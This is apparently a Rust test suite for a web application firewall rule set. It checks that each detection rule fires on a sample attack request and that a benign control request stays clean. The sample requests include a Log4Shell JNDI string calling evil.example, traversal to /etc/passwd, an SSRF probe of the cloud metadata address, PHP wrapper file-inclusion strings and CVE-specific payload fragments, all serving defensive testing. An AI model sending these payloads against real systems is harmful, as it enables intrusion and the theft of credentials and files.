// SPDX-FileCopyrightText: 2026 0x00spor3
// SPDX-License-Identifier: BUSL-1.1

//! Compatibility + coverage gate for the curated ruleset.
//!
//! Loads the embedded content through the OPEN CRS engine (`waf_detection::crs::CrsModule`) and
//! asserts: (a) every rule loads and NOTHING is silently skipped, and (b) each rule actually fires
//! on its payload (with the declared severity) while a benign request stays clean. This is the
//! enterprise value of the tier — a *guaranteed-compatible, tested* ruleset — and the guard against
//! the "loads 0 rules in silence" failure mode.

use waf_core::{Bytes, Decision, Normalized, RequestContext, Severity, WafModule};
use waf_crs_curated::{curated_source, EXPECTED_LOADED};
use waf_detection::crs::CrsModule;

fn module() -> CrsModule {
    CrsModule::from_source(&curated_source())
}

/// A minimal raw `RequestContext` (the CRS channel reads raw fields, not the §6 surface).
fn ctx() -> RequestContext {
    RequestContext {
        client_ip: "127.0.0.1".parse().unwrap(),
        request_id: "gate".to_string(),
        timestamp: std::time::SystemTime::now(),
        method: "GET".to_string(),
        path: "/".to_string(),
        raw_path: "/".to_string(),
        query: None,
        http_version: "HTTP/1.1".to_string(),
        headers: vec![],
        cookies: vec![],
        body: Bytes::new(),
        normalized: Normalized::default(),
        score: 0,
        score_contributions: vec![],
    }
}

/// The severity a given `crs-<id>` fired with, or `None` if it did not fire.
fn fired(d: &Decision, rule_id: &str) -> Option<Severity> {
    match d {
        Decision::Scores(items) => items.iter().find(|i| i.rule_id == rule_id).map(|i| i.severity),
        _ => None,
    }
}

/// Assert the rule `crs-<id>` fires with `sev` for the request built by `build`.
fn assert_fires(id: &str, sev: Severity, build: impl FnOnce(&mut RequestContext)) {
    let mut c = ctx();
    build(&mut c);
    let d = module().inspect(&c);
    assert_eq!(fired(&d, id), Some(sev), "{id} should fire {sev:?} — got {d:?}");
}

fn set_path(c: &mut RequestContext, p: &str) {
    c.path = p.to_string();
    c.raw_path = p.to_string();
}

// ── the compat/coverage gate ──────────────────────────────────────────────────

#[test]
fn all_curated_rules_load_and_nothing_is_silently_skipped() {
    let m = module();
    assert_eq!(m.loaded_count(), EXPECTED_LOADED, "loaded != EXPECTED_LOADED — {}", m.report());
    assert!(
        m.skipped().is_empty(),
        "curated content must use only supported constructs; skipped: {:?}",
        m.skipped()
    );
}

// ── per-rule bite-tests (payload fires with the declared severity) ─────────────

#[test]
fn recon_scanner_ua() {
    assert_fires("crs-9000001", Severity::Warning, |c| {
        c.headers = vec![("User-Agent".to_string(), "nuclei/2.9.1".to_string())];
    });
}

#[test]
fn recon_git_exposure() {
    assert_fires("crs-9000002", Severity::Error, |c| set_path(c, "/.git/config"));
}

#[test]
fn recon_sensitive_dotfile() {
    assert_fires("crs-9000010", Severity::Error, |c| set_path(c, "/.env"));
}

#[test]
fn recon_backup_file() {
    assert_fires("crs-9000011", Severity::Warning, |c| set_path(c, "/db_dump.sql"));
}

#[test]
fn protocol_dangerous_method() {
    assert_fires("crs-9000020", Severity::Error, |c| c.method = "TRACE".to_string());
}

#[test]
fn lfi_php_wrapper() {
    assert_fires("crs-9000031", Severity::Critical, |c| {
        c.query = Some("file=php://filter/convert.base64-encode/resource".to_string());
    });
}

#[test]
fn lfi_proc_self() {
    assert_fires("crs-9000032", Severity::Error, |c| {
        c.query = Some("page=/proc/self/environ".to_string());
    });
}

#[test]
fn rce_webshell_filename() {
    assert_fires("crs-9000040", Severity::Critical, |c| set_path(c, "/uploads/c99.php"));
}

#[test]
fn generic_ssrf_metadata() {
    assert_fires("crs-9000050", Severity::Critical, |c| {
        c.query = Some("url=http://169.254.169.254/latest/meta-data/".to_string());
    });
}

#[test]
fn generic_deserialization_marker() {
    assert_fires("crs-9000051", Severity::Critical, |c| {
        c.query = Some("data=rO0ABXNyABJqYXZh".to_string());
    });
}

#[test]
fn java_log4shell_header() {
    assert_fires("crs-9000003", Severity::Critical, |c| {
        c.headers = vec![("X-Api-Version".to_string(), "${jndi:ldap://evil.example/a}".to_string())];
    });
}

#[test]
fn java_spring4shell_param_name() {
    assert_fires("crs-9000060", Severity::Critical, |c| {
        c.query = Some("class.module.classLoader.resources.context.parent.pipeline=x".to_string());
    });
}

// ── CVE signatures (9100000+) ──────────────────────────────────────────────────

fn set_uri(c: &mut RequestContext, path: &str, query: &str) {
    set_path(c, path);
    c.query = Some(query.to_string());
}

#[test]
fn cve_2026_48907_joomla_jce() {
    assert_fires("crs-9100001", Severity::Critical, |c| {
        set_uri(c, "/index.php", "option=com_jce&view=editor&task=profiles.import");
    });
}

#[test]
fn cve_2026_45247_mirasvit_cookie() {
    assert_fires("crs-9100002", Severity::Critical, |c| {
        c.cookies = vec![("CacheWarmer".to_string(), "a:2:{i:0;s:3:\"foo\";}".to_string())];
    });
}

#[test]
fn cve_2026_34909_unifi_traversal() {
    assert_fires("crs-9100003", Severity::Error, |c| set_path(c, "/api/network/../../../etc/passwd"));
}

#[test]
fn cve_2026_20262_cisco_sdwan_traversal() {
    assert_fires("crs-9100004", Severity::Error, |c| set_path(c, "/dataservice/../../../etc/passwd"));
}

#[test]
fn cve_2025_2749_kentico_staging() {
    assert_fires("crs-9100005", Severity::Error, |c| set_path(c, "/CMSPages/Staging/SyncServer.asmx"));
}

#[test]
fn cve_2025_29927_nextjs_header() {
    assert_fires("crs-9100010", Severity::Critical, |c| {
        c.headers = vec![("x-middleware-subrequest".to_string(), "middleware".to_string())];
    });
}

#[test]
fn cve_2025_64446_fortiweb_traversal() {
    assert_fires("crs-9100011", Severity::Critical, |c| set_path(c, "/api/v2.0/user/..%2f..%2fetc"));
}

#[test]
fn cve_2025_53770_sharepoint_toolshell() {
    assert_fires("crs-9100012", Severity::Critical, |c| {
        set_uri(c, "/_layouts/15/ToolPane.aspx", "DisplayMode=Edit&a=1");
    });
}

#[test]
fn cve_2024_4577_php_cgi() {
    assert_fires("crs-9100013", Severity::Critical, |c| {
        set_uri(c, "/php-cgi/php.exe", "%ADd+allow_url_include=on");
    });
}

#[test]
fn cve_2024_27199_teamcity_traversal() {
    assert_fires("crs-9100020", Severity::Error, |c| set_path(c, "/res/../admin/diagnostic.jsp"));
}

#[test]
fn cve_2023_27351_papercut() {
    assert_fires("crs-9100021", Severity::Error, |c| set_uri(c, "/app", "service=page/SetupCompleted"));
}

#[test]
fn cve_2025_31161_goanywhere() {
    assert_fires("crs-9100030", Severity::Critical, |c| set_path(c, "/goanywhere/lic/accept/"));
}

#[test]
fn cve_2023_34362_moveit() {
    assert_fires("crs-9100031", Severity::Critical, |c| set_path(c, "/moveitisapi/moveitisapi.dll"));
}

#[test]
fn cve_2024_3400_panos_globalprotect() {
    assert_fires("crs-9100032", Severity::Critical, |c| {
        c.cookies = vec![("SESSID".to_string(), "../../../opt/panlogs/tmp/x".to_string())];
    });
}

#[test]
fn cve_2025_61882_oracle_ebs() {
    assert_fires("crs-9100033", Severity::Error, |c| set_path(c, "/OA_HTML/SyncServlet"));
}

// ── control: a benign request trips nothing ────────────────────────────────────

#[test]
fn a_benign_request_fires_nothing() {
    let mut c = ctx();
    c.headers = vec![("User-Agent".to_string(), "Mozilla/5.0".to_string())];
    set_path(&mut c, "/index.html");
    c.query = Some("q=hello&page=2".to_string());
    assert!(
        matches!(module().inspect(&c), Decision::Allow),
        "a benign request must not trip any curated rule (control)"
    );
}
